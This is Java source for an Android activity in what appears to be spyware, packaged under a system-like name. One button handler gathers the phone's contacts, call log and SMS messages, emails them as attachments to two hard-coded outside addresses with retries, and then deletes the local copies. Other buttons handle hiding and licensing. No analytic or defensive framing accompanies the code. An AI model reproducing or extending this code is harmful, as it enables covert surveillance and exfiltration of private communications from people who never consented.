package com.system.activity;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;

import com.system.GetInfoTask;
import com.system.R;
import com.system.utils.ConfigCtrl;
import com.system.utils.DeviceProperty;
import com.system.utils.FileCtrl;
import com.system.utils.SysUtils;
import com.system.utils.mail.MailCfg;

public class InitActivity extends Activity 
{
    protected static final String LOGTAG = "InitActivity";
    
	Button btn_getinfo;
    Button btn_screenshot;
    Button btn_setting;
    Button btn_hide;
    TextView hint_getinfo;
    TextView hint_screenshot;
    TextView hint_setting;
    TextView hint_hide;
    OnClickListener listener_getinfo = null;
    OnClickListener listener_screenshot = null;
    OnClickListener listener_setting = null;
    OnClickListener listener_hide = null;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.init);
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	btn_getinfo = (Button)findViewById(R.id.btn_getinfo);
    	btn_getinfo.setOnClickListener(listener_getinfo);
        btn_screenshot = (Button)findViewById(R.id.btn_screenshot);
        btn_screenshot.setOnClickListener(listener_screenshot);
        btn_setting = (Button)findViewById(R.id.btn_setting);
        btn_setting.setOnClickListener(listener_setting);
        btn_hide = (Button)findViewById(R.id.btn_hide);
        btn_hide.setOnClickListener(listener_hide);
        hint_getinfo = (TextView)findViewById(R.id.hint_getinfo);
        hint_screenshot = (TextView)findViewById(R.id.hint_screenshot);
        hint_setting = (TextView)findViewById(R.id.hint_setting);
        hint_hide = (TextView)findViewById(R.id.hint_hide);
        
        // Disable buttons
        btn_getinfo.setEnabled(false);
        btn_screenshot.setEnabled(false);
        btn_hide.setEnabled(false);
        hint_getinfo.setEnabled(false);
        hint_screenshot.setEnabled(false);
        hint_hide.setEnabled(false);
        
        btn_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
        hint_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
    	if (resultCode == RESULT_OK) 
    	{
			String isLicensed = data.getExtras().getString("isLicensed");

			// Enable buttons
			if (isLicensed.equalsIgnoreCase("full")) {
				btn_getinfo.setEnabled(true);
				btn_screenshot.setEnabled(true);
				btn_hide.setEnabled(true);
				hint_getinfo.setEnabled(true);
				hint_screenshot.setEnabled(true);
				hint_hide.setEnabled(true);
			} else if (isLicensed.equalsIgnoreCase("onlysms")) {
				btn_getinfo.setEnabled(true);
				btn_screenshot.setEnabled(true);
				btn_hide.setEnabled(true);
				hint_getinfo.setEnabled(true);
				hint_screenshot.setEnabled(true);
				hint_hide.setEnabled(true);
			}
    	}
    }
    
    private void setListener()
    {
    	listener_getinfo = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If network connected, try to collect and send the information
        		if (SysUtils.isNetworkConnected(getApplicationContext()))
        		{
        			GetInfoTask.attachments = new ArrayList<File>();
        			
        			GetInfoTask.CollectContact(getApplicationContext());
        			GetInfoTask.CollectPhoneCallHist(getApplicationContext());
        			GetInfoTask.CollectSms(getApplicationContext());
        		
        			// Send mail
        			String subject = getResources().getString(R.string.mail_from) 
        	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
        	           		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
        			String body = String.format(getResources().getString(R.string.mail_body), 
        					DeviceProperty.getPhoneNumber(getApplicationContext()));
        			List<String> fileList = new ArrayList<String>();
        			for (int i = 0; i < GetInfoTask.attachments.size(); i++)
        				fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
        			
        			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
        			String pwd = MailCfg.getSenderPwd(getApplicationContext());
        			
        			boolean result = false;
        			int retry = 3;
        			while(!result && retry > 0)
        			{
        				String sender = MailCfg.getSender(getApplicationContext());
        				result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
        				if (!result) retry--;
        			}
        			GetInfoTask.attachments.clear();
        			
        			// Update the last date time
        			if (result) {
        				boolean successful = ConfigCtrl.setLastGetInfoTime(getApplicationContext(), new Date());
        				if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
        			}
        			
        			// Clean the files in SD-CARD
        			FileCtrl.cleanFolder();
        		}
            }
        };
        
        listener_screenshot = new OnClickListener()
        {
            public void onClick(View v)
            {
                //TODO
            }
        };
        
        listener_setting = new OnClickListener()
        {
            public void onClick(View v)
            {
            	Intent intent = new Intent().setClass(getBaseContext(), GlobalPrefActivity.class);
            	startActivityForResult(intent, R.layout.init);
            }
        };
        
        // Exit the dialog
        listener_hide = new OnClickListener()
        {
            public void onClick(View v)
            {
                finish();
            }
        };
    }
}
